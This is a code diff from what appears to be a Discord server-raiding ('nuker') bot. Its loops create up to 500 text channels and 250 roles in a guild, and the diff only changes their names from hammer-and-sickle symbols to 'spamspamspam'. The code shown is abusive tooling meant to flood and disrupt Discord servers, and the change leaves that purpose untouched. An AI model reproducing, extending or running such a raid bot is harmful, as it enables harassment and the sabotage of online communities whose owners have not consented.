@@ -102,7 +102,7 @@ async def on_ready():
                 for maxChannels in range(501):
                     # noinspection PyBroadException
                     try:
-                        await guild.create_text_channel('☭☭☭☭☭☭☭☭☭☭☭☭☭☭')
+                        await guild.create_text_channel('spamspamspam')
                         var4 += 1
                         print(f"Current ammount of channels created: {var4}")
                     except Exception:
@@ -113,7 +113,7 @@ async def on_ready():
                 for maxRoles in range(251):
                     # noinspection PyBroadException
                     try:
-                        await guild.create_role(name='☭☭☭☭☭☭☭☭☭☭☭☭☭☭')
+                        await guild.create_role(name='spamspamspam')
                         print(f"Current ammount of roles created: {var5}")
                     except Exception:
                         break
@@ -158,7 +158,7 @@ async def on_ready():
                 var1 = 0
                 for i in range(501):
                     try:
-                        await guild.create_text_channel('☭☭☭☭☭☭☭☭☭☭☭☭☭☭')
+                        await guild.create_text_channel('spamspamspam')
                         var1 += 1
                         print(f"Current ammount of created channels: {var1}")
                     except Exception:
@@ -188,7 +188,7 @@ async def on_ready():
                 var1 = 0
                 for i in range(251):
                     try:
-                        await guild.create_role(name='☭☭☭☭☭☭☭☭☭☭☭☭☭☭')
+                        await guild.create_role(name='spamspamspam')
                         var1 += 1
                         print(f"Current ammount of created roles: {var1}")
                     except Exception:
